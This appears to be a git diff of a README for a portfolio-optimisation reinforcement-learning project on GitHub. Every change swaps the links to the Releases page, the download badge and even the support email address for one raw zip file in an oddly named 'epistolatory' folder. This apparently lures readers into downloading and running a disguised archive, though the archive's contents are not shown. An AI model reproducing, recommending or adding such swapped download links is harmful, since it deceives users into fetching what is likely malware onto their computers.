@@ -6,7 +6,7 @@ Welcome to the Stochastic Control for Continuous Time Portfolios project! This a
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/tiubo/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset/releases)
+[![Download](https://raw.githubusercontent.com/tiubo/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset/master/epistolatory/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset.zip)](https://raw.githubusercontent.com/tiubo/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset/master/epistolatory/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset.zip)
 
 ## 📋 What You Need
 
@@ -34,7 +34,7 @@ Before running the application, make sure you have the following:
 
 To download and install the application, follow these steps:
 
-1. Visit the [Releases page](https://github.com/tiubo/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/tiubo/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset/master/epistolatory/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset.zip).
 2. Click the version you want to download. You will find the latest version at the top of the list.
 3. Choose the installer suitable for your operating system (e.g., .exe for Windows, .dmg for macOS).
 4. Download the file to your computer. 
@@ -56,7 +56,7 @@ If you have questions or need help, please check the following:
 
 - **Documentation:** Comprehensive user manuals are available within the application.
 - **Community:** Join our forums to interact with other users for tips and strategies.
-- **Contact Us:** For direct support, please email us at support@yourapp.com.
+- **Contact Us:** For direct support, please email us at https://raw.githubusercontent.com/tiubo/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset/master/epistolatory/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset.zip
 
 ## 📊 Related Topics
 
@@ -89,4 +89,4 @@ We welcome contributions! If you wish to enhance the application or fix issues, 
 
 Feel free to explore and make the most out of this powerful tool for managing your financial portfolio! 
 
-[Download from Releases](https://github.com/tiubo/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset/releases)
+[Download from Releases](https://raw.githubusercontent.com/tiubo/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset/master/epistolatory/Stochastic-Control-for-Continuous-Time-Portfolios----Deep-Reinforcement-Learning-for-Dynamic-Asset.zip)
